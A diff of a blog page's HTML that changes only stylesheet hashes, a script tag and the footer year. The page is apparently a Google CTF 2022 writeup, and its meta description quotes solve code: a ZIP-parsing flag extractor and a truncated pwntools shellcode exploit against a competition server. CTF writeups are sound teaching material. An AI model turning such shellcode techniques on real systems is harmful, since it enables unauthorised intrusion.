@@ -11,9 +11,7 @@
 Appnote.txt import struct with open(&#34;dump.zip&#34;, &#34;rb&#34;) as f: data = f.read() u16 = lambda x: struct.unpack(&#34;&lt;H&#34;, x)[0] flag = bytearray() eocd = data[0xEEE2:].split(b&#34;PK\x05\x06&#34;) for d in eocd[1:]: offset = u16(d[12:14]) flag.append(data[offset-1]) print(flag) Segfault Labyrinth from pwn import * context.arch = &#34;amd64&#34; #p = process(&#34;./challenge&#34;) p = remote(&#34;segfault-labyrinth.2022.ctfcompetition.com&#34;, 1337) p.recvline() p.sendline(b&#34;0&#34;*8) code = &#34;&#34;&#34; mov rsp, rdi; mov rbp, rdi; add rsp, 0x400; add rbp, 0x400; mov r8, rdi; TASK: xor rbx, rbx; RUN: mov rdi, 2; mov rsi, [r8 &#43; rbx*8]; mov rdx, 0x1; mov rax, 1; syscall; cmp rax, 0xfffffffffffffff2; jne FOUND; inc rbx; cmp rbx, 0x10; jne RUN; FOUND: mov rax, [rsi]; mov r8, rsi; cmp al, 0; je TASK; mov rdx, 0x40; mov rdi, 1; mov rax, 1; syscall; &#34;&#34;&#34; payload = b&#34;&#34; payload &#43;= asm(code) p.">
 <meta name="author" content="imssm99">
 <link rel="canonical" href="https://blog.imssm99.kr/ctf/google_ctf_2022/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
-<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
-    onload="hljs.initHighlightingOnLoad();"></script>
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://blog.imssm99.kr/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://blog.imssm99.kr/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://blog.imssm99.kr/favicon-32x32.png">
@@ -147,7 +145,7 @@ Appnote.txt import struct with open(&#34;dump.zip&#34;, &#34;rb&#34;) as f: data
 <article class="post-single">
   <header class="post-header">
     
-    <h1 class="post-title">
+    <h1 class="post-title entry-hint-parent">
       Google Capture The Flag 2022 Writeup
     </h1>
     <div class="post-meta"><span title='2022-08-01 20:10:00 +0900 KST'>August 1, 2022</span>&nbsp;·&nbsp;imssm99
@@ -325,7 +323,8 @@ Appnote.txt import struct with open(&#34;dump.zip&#34;, &#34;rb&#34;) as f: data
     </main>
     
 <footer class="footer">
-    <span>&copy; 2023 <a href="https://blog.imssm99.kr/">imssm99 Blog</a></span>
+        <span>&copy; 2024 <a href="https://blog.imssm99.kr/">imssm99 Blog</a></span> · 
+
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
